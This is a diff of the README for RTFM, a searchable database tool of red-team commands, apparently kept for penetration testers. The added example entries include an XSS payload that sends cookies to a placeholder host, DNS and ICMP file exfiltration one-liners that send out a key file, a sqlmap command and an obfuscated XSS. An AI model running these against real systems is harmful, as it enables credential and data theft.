@@ -30,8 +30,7 @@ Options:
   -a AUTHOR, --author=AUTHOR
                         Search for author
   -A DATE, --added-on=DATE
-                        Search by date, usefull for when you want to commit
-                        back!
+                        Search by date, useful for when you want to commit back!
   -p PRINTER, --print=PRINTER
                         Print Types : P(retty) p(astable) w(iki) h(tml) d(ump)
   -i INSERT, --insert=INSERT
@@ -52,32 +51,106 @@ Its pretty much a simple search program, nothing to fancy, examples include:
 # Searching the DB
 Searching the DB is handled through the following switches: t, c, R, r, a and, A:
 
--c is search for a command:
+
+-c is search for a command. Use this when you know what command you want to look for, but can't quite remember the syntax. For example, if you want to quickly look up the syntax for a common sqlmap command. Useful for jumping straight to collections of common flags or one liners:
 ```
-./rtfm.py -c rtfm
-
-++++++++++++++++++++++++++++++
-Command ID : 0
-Command    : RTFM
-
-Comment    : helpception
-Tags       : Linux
-Date Added : 2017-01-30
-++++++++++++++++++++++++++++++
-```
-
--t is search for a tag, Tags can be shown through -Dt
-```
-rtfm.py -Dt
- | linux |  | bash |  | text manipulation |  | cisco |  | networking |  | loop |  | pivoting |  | files |  | passwords |  | enumeration |  | user information |  | interesting |  | scanning |  | hp |  | brute |  | http |  | web application |  | XSS |  | cookies |  | metasploit |  | certificates |  | stealth |  | smb |  | MitM |  | dns |  | package management |  | reverse shells |  | Windows |  | perl |  | python |  | php |  | ruby |  | sql injection |  | mysql |  | shell |  | mssql |  | Oracle |  | users |  | wireless |  | wifi |  | configuration |  | av evasion |  | powershell |  | memory |  | impacket |  | filesystem |  | IIS |  | process management |  | privilege escalation |  | remote command shell |  | hashes |  | recon |  | cracking |  | nessus |  | subnets |  | packet capture |  | reference |  | web address |  | java |  | solaris |  | forensics |  | ldap |  | Anti Virus |  | GIT |  | interesting  |  | Cloud |  | RDP |  | shells |  | encyption |  | test |  | a | 
-
-./rtfm.py -t windows
+19:54:root:rtfm: ./rtfm.py -pP -c 'sqlmap' 
++----------------+--------------------------------------------------------------------------------------------------+
+| Added By @yght | Cmd ID : 162                                                                                     |
++----------------+--------------------------------------------------------------------------------------------------+
+| Command        | /opt/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o |
+|                | -r sql1.txt                                                                                      |
+|                |                                                                                                  |
+| Comment        | SQLmap generic command                                                                           |
+| Tags           | sql injection                                                                                    |
+| Date added     | 2017-06-19                                                                                       |
+| References     | https://github.com/sqlmapproject/sqlmap/wiki/Usage                                               |
++----------------+--------------------------------------------------------------------------------------------------+
 ```
 
--a is to search by author:
+-t is search for a tag, tags are groups of similar commands, for example, XSS payloads. Use this when wanting a more generic search such as around flaws or around generic Windows commands:
+```
+19:54:root:rtfm: ./rtfm.py -pP -t xss
++----------------+------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 35                                                                        |
++----------------+------------------------------------------------------------------------------------+
+| Command        | <script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); |
+|                | i.send();</script>                                                                 |
+|                |                                                                                    |
+| Comment        | Grab the cookie                                                                    |
+| Tags           | web application                                                                    |
+|                | XSS                                                                                |
+|                | cookies                                                                            |
+| Date added     | 2017-06-19                                                                         |
+| References     | https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet                     |
+|                | https://excess-xss.com/                                                            |
++----------------+------------------------------------------------------------------------------------+
+<snip>
+```
+
+All the Tags known about can be shown through -Dt, Currently a few typos that will be fixed in version 0.9.9:
+```
+ $ rtfm.py -Dt
+ | linux |  | bash |  | text manipulation |  | cisco |  | networking |  | loop |  | pivoting |  | files |  | passwords |  | enumeration |  | user information |  | interesting |  | scanning |  | hp |  | brute |  | http |  | web application |  | XSS |  | cookies |  | metasploit |  | certificates |  | stealth |  | smb |  | MitM |  | dns |  | package management |  | reverse shells |  | Windows |  | perl |  | python |  | php |  | ruby |  | sql injection |  | mysql |  | shell |  | mssql |  | Oracle |  | users |  | wireless |  | wifi |  | configuration |  | av evasion |  | powershell |  | memory |  | impacket |  | filesystem |  | IIS |  | process management |  | privilege escalation |  | remote command shell |  | hashes |  | recon |  | cracking |  | nessus |  | subnets |  | packet capture |  | reference |  | web address |  | java |  | solaris |  | forensics |  | ldap |  | Anti Virus |  | GIT |  | interesting  |  | Cloud |  | RDP |  | shells |  | encryption |  | Troll |  | buffer overflow |  | mona |  | interseting |  | brute force |  | Apple |  | encoding |  | ascii |  | web app |  | Cyber Essentials |  | tools |  | code execution |  | jsp | 
+```
+
+The next one you will want is -R, this is for searching for a 'remark' (aka comment, didn't want two c flags), this is to search the comments field and is more along the lines of searching for techniques or generic terms such as 'X11' or 'exfil': 
+```
++----------------+------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 384                                                                       |
++----------------+------------------------------------------------------------------------------------+
+| Command        | for line in `base64 -w 62 [file]`; do host $line.[hostname]; done                  |
+|                |                                                                                    |
+| Comment        | exfil file through DNS, may want to encrypt, also assuming you have a short domain |
+| Tags           | linux                                                                              |
+|                | bash                                                                               |
+|                | loop                                                                               |
+|                | interesting                                                                        |
+| Date added     | 2017-06-19                                                                         |
+| References     | https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504                  |
++----------------+------------------------------------------------------------------------------------+
++----------------+--------------------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 386                                                                                     |
++----------------+--------------------------------------------------------------------------------------------------+
+| Command        | ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64         |
+|                | sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do |
+|                | 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32       |
+|                |                                                                                                  |
+| Comment        | Exfil over icmp                                                                                  |
+| Tags           | linux                                                                                            |
+|                | networking                                                                                       |
+|                | loop                                                                                             |
+|                | interesting                                                                                      |
+| Date added     | 2017-06-19                                                                                       |
+| References     | https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504                                |
++----------------+--------------------------------------------------------------------------------------------------+
++----------------+-----------------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 496                                                                                  |
++----------------+-----------------------------------------------------------------------------------------------+
+| Command        | for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v                            |
+|                | "......................................................" | sed s/.*11/11/g | grep "11.*99"  | |
+|                | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed        |
+|                | s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo                |
+|                | +++++++++++++++++++; done                                                                     |
+|                |                                                                                               |
+| Comment        | Convert exfil ICMP back to files from pcap                                                    |
+| Tags           | linux                                                                                         |
+|                | networking                                                                                    |
+|                | loop                                                                                          |
+| Date added     | 2017-06-19                                                                                    |
+| References     | https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only                     |
++----------------+-----------------------------------------------------------------------------------------------+
+
+```
+
+
+These next two are aimed for when you wish to commit back, and wouldn't be normally used:
+
+-a is to search by author, for example, show things you have added:
 `./rtfm.py -a innes`
 
--A is 'Added on date', this can be one of yyyy-mm-dd, or now/today, most usefull for dumping out commands you have added to commit back to the git!
+-A is 'Added on date', this can be one of yyyy-mm-dd, or now/today, most usefully for dumping out commands you have added to commit back to the git!
+
 ```
 rtfm.py -A now
 ++++++++++++++++++++++++++++++
@@ -109,7 +182,7 @@ b
 
 ```
 
-All of these can be combinded to create a very specfic search should you wish, shown here with debugging on:
+All of these search flags can be combinded to create a very specfic search should you wish, shown here with debugging on:
 ```
 rtfm.py -c rtfm -a innes -t linux -R help -A 2017-05-10 -d
 [DEBUG]: Options Set: {'insert': None, 'remark': 'help', 'printer': None, 'dump': None, 'author': 'innes', 'cmd': 'rtfm', 'update': None, 'debug': True, 'tag': 'linux', 'date': '2017-05-10', 'delete': None, 'refer': None}
@@ -134,12 +207,12 @@ https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
 
 # Updating your database
 
-RTFM implements a simple text file format to pull in updates to the database, these are shared VIA git, and implement a simple sha check to make sure they have not been corupt during download. The updates called by the command are 'safe' in the form they wont write over your DB, should you git pull, it probabley will overwrite your DB. If you are git cloning, you can move your database to '/etc/rtfm/snips.db' to protect your database file. 
+RTFM implements a simple text file format to pull in updates to the database, these are shared VIA git, and implement a simple sha check to make sure they have not been corrupt during download. The updates called by the command are 'safe' in the form they won't write over your DB, should you git pull, it probably will overwrite your DB. If you are git cloning, you can move your database to '/etc/rtfm/snips.db' to protect your database file. 
 ```
 ./rtfm.py -u
 [WARNING]: No DB, please run rtfm -u
 [OK]: This may appear to hang. Run with debug to get more info
-[OK]: Program version information :
+[OK]: Program version information:
 [OK]: Your up to date :
 0.9.8
  Added A way of fixing typo's in the database 
@@ -164,28 +237,92 @@ DATE
 [OK]: Hopefully fixed lots of commands
 [OK]: Update complete
 
-	xx: Show update process
 ```
 
 The update process also now drags in errata for the local DB allowing me a centralised way of neatly fixing the typos which have filtered into the DB. These are set through https://raw.githubusercontent.com/leostat/rtfm/master/updates/errata.txt. This allows things to be 'fixed' without needing to remove anything from the database.
 
-# Inserting into the Database
-Like all good cheatsheets it is possible to add your own content to the database. This is managed through the -i segment of the program. When adding commands you must add them with comments, references, and tags. Else at the moment, they will not be returned from the DB. Minor bug really. There are two main methods of adding commands to the database, Either in three steps adding all the commands you wish, Tag these commands up, then insert references. Or in one step, adding all commands, along with their tags and references. Most of the time you will be wanting to call -E:
+# Inserting and committing back
+Like all good cheatsheets, it is possible to add your own content to the database. This is managed through the -i segment of the program. When adding commands you must add them with comments, references, and tags. Else at the moment, they will not be returned from the DB. Minor bug really. This is done by adding all commands, along with their tags and references at once through using -iE, Insert everything:
 ```
-$ rtfm.py -i E
-Enter your command    : Command One
-Enter you comment     : Comment One
-Enter Author          : Author
-Enter a tag (blank for end) : Tag
+9:41:root:rtfm: ./rtfm.py -iE
+Enter your command    : セ=ア[ミ=ウ],ハ=++ミ+ウ,ヘ=ホ[ミ+ハ],ア[ヘ+=ホ[ウ]+(ホ.ホ+ホ)[ウ]+ネ[ハ]+ヌ+セ+ア[ミ]+ヘ+ヌ+ホ[ウ]+セ][ヘ](ネ[ウ]+ネ[ミ]+ア[ハ]+セ+ヌ+"(ウ)")()
+Enter you comment     : Script alert(1) using Katakana 
+Enter Author          : Innes
+Enter a tag (blank for end) : xss
+Enter a tag (blank for end) : web application
 Enter a tag (blank for end) : 
-Enter a reference (blank for end) : Reference
+Enter a reference (blank for end) : https://github.com/aemkei/katakana.js
 Enter a reference (blank for end) : 
 [OK]: Added Rows :1
-[OK]: Added a new tag and a tagmap
+[OK]: Added tags
+[OK]: Added tags
 [OK]: Added a new Ref and a refmap
 Enter your command    : ^C
+
+Cancelled.
+
 ```
 
+After committing to your local database I would be extremely grateful if you would open a pull request so that I am able to continue to add to the database. This is really easy, and done through the use of an output format 'pd' (print dump). The easiest way is by searching for commands added by yourself on today, then opening a git pull request, for the above example:
+```
+19:43:root:rtfm: ./rtfm.py -a Innes -A now -pd
+セ=ア[ミ=ウ],ハ=++ミ+ウ,ヘ=ホ[ミ+ハ],ア[ヘ+=ホ[ウ]+(ホ.ホ+ホ)[ウ]+ネ[ハ]+ヌ+セ+ア[ミ]+ヘ+ヌ+ホ[ウ]+セ][ヘ](ネ[ウ]+ネ[ミ]+ア[ハ]+セ+ヌ+"(ウ)")()
+Script alert(1) using Katakana 
+Innes
+EOC
+web application
+XSS
+EOT
+https://github.com/aemkei/katakana.js
+EOR
+```
+
+The above is the correct format for the updates, so you can add a file and I can either merge into one large update file, or keep it as a separate file! 
+
+# Output Formats
+
+There is also a number of output options, such as copy any paste, pretty, wiki and update:
+```
+23:15:root:snips: ./rtfm.py -c rtfm -p p
+++++++++++++++++++++++++++++++
+RTFM
+
+helpception
+++++++++++++++++++++++++++++++
+
+23:15:root:snips: ./rtfm.py -c rtfm -p P
++-------------+-------------+
+| Command ID  | 0           |
++-------------+-------------+
+| Command     | RTFM        |
+|             |             |
+| Comment     | helpception |
+| Tags        | Linux       |
+| Date added  | 2017-01-30  |
++-------------+-------------+
+
+23:15:root:snips: ./rtfm.py -c rtfm -p w
+= Helpception, search for a command with two tags and a comment = 
+ rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
+linux
+https://github.com/leostat/rtfm
+
+```
+The update format is to make it easy to open pull requests for new commands!
+```
+rtfm.py -pd -c rtfm
+rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
+Helpception, search for a command with two tags and a comment
+Innes
+EOC
+linux
+EOT
+https://github.com/leostat/rtfm
+https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
+EOR
+```
+
+# Older way
 Should you wish to add say lots of commands at once, then worry about tags and references later you could do call RTFM with '-i c', using an empty response to stop processing commands:
 ```
 $ rtfm.py -i c
@@ -234,64 +371,24 @@ $ rtfm: ./rtfm.py -i ta
 
 Enter a tag (blank for non) : 
 ```
-# Deleteing content
+
+# Deleting content
 This is simple enough, 'tis just using:
 `rtfm.py --delete 1`
 
 # Debugging
-Througout the entire program, I have tried to add 'debug' calls '-d', these show you what the SQL is doing, what is being passed around.
+Throughout the entire program, I have tried to add 'debug' calls '-d', these show you what the SQL is doing, what is being passed around.
 
-# Output Formats
 
-There is also a number of output options, such as copy any paste, pretty, wiki and update:
-```
-23:15:root:snips: ./rtfm.py -c rtfm -p p
-++++++++++++++++++++++++++++++
-RTFM
-
-helpception
-++++++++++++++++++++++++++++++
-
-23:15:root:snips: ./rtfm.py -c rtfm -p P
-+-------------+-------------+
-| Command ID  | 0           |
-+-------------+-------------+
-| Command     | RTFM        |
-|             |             |
-| Comment     | helpception |
-| Tags        | Linux       |
-| Date added  | 2017-01-30  |
-+-------------+-------------+
-
-23:15:root:snips: ./rtfm.py -c rtfm -p w
-= Helpception, search for a command with two tags and a comment = 
- rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
-linux
-https://github.com/leostat/rtfm
-
-```
-The update format is to make it easy to open pull requests for new commands!
-```
-rtfm.py -pd -c rtfm
-rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
-Helpception, search for a command with two tags and a comment
-Innes
-EOC
-linux
-EOT
-https://github.com/leostat/rtfm
-https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
-EOR
-```
 
 # The TODO  list
  * The 'important' functionality is present, but still lots of work to do
  * Changes are happening on the DB, which means it may 'break' from time to time, just do a git pull to fix 
  
 ## Fixes:
- * Probabley should use prepared statements : local so dont care
+ * Probably should use prepared statements: local so don't care
  * Check for dupe tags
- * Warn on dupe tags
+ * Central tag updates
 
 ## Pipeline:
  * Template engine(autofill [user] : A user = innes, pass = password, attacker = 1.1.1.1, victim = 2.2.2.2
